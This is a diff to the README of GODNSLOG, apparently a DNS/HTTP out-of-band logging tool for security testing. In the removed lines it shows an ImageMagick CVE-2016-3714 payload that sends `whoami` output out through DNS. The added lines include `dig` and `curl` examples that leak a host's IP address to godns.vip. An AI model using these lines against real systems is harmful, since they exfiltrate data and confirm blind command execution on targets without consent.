@@ -20,36 +20,27 @@ GODNSLOG在设计中大量参考了[CEYE.IO](http://ceye.io)，包括本文档�
 
 ## DNS LOG功能
 
-DNS queries resolve in a number of different ways. In this case, CEYE.IO platform provide a dnsserver to resolve domain - ceye.io. Its nameserver address is set to own server IP, therefore all DNS queries about domain - ceye.io will be sent to own DNS server eventually.
+每个用户分配一个唯一的三级域名，该域名或其子域名的所有解析记录均会被记录。
+请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时
 
-For example, use nslookup to query dnsquery.test.b182oj.ceye.io in terminal, and you will found this querying in record page: 
 
-![](https://images.seebug.org/ceye/dns-query-1.png)
+```bash
+dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.ktqlujjpgc4j.godns.vip
+```
 
-The Remote column recording client ip address, Query Name column recoding domain name client queried, UPDate column show the last time queried, and Count column show how many times querying for this domain. 
+系统生成域名为`{$variable}.ktqlujjpgc4j.godns.vip`，其中`ktqlujjpgc4j`是用户唯一shortId，`{$variable}`为用户自定义变量
 
-![](https://images.seebug.org/ceye/dns-query-2.png)
 
-Also, there is all records detail about b182oj.ceye.io or *.b182oj.ceye.io DNS queries in DNS queries page. In this page, You can clearly or export these records.
-
-CVE-2016–3714 - the RCE vulnerability in ImageMagick, influencing many applications used this componment, but in this case, may be there is no feedback when testing this vulnerability, because of ImageMagick couldn't return any information usually. With CEYE.IO platform, you can send Payload with a specail mark to collect the command execution result returned.
-
-e.g. (cve-2016-3714.mvg)
-
-  push graphic-context
-  viewbox 0 0 640 480
-  fill 'url(https://example.com/"|ping `whoami`.rce.imagemagick.b182oj.ceye.io")'
-  pop graphic-context
-
-whoami will be executed in linux system if this host is vulnerable, and padding its value with .rce.imagemagick.b182oj.ceye.io, ping command will be executed, you will found the result in DNS queries page if succeed: 
-
-![](https://images.seebug.org/ceye/dns-query-3.png)
+![](dnslog.png)
 
 
 DNSLOG 记录内容包含以下字段：
 - domain
 - IP
 - 记录时间
+
+请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时
+
 
 
 ## HTTP LOG功能
@@ -66,7 +57,10 @@ GODNSLOG 的`/log/`接口提供了HTTPLOG的功能，访问`http://*.{shortId}.g
 - Data body数据
 - 记录时间
 
-![](https://images.seebug.org/ceye/http-request-1.png)
+```bash
+curl http://ktqlujjpgc4j.godns.vip/log/`/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
+```
+请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时
 
 
 ## 致谢
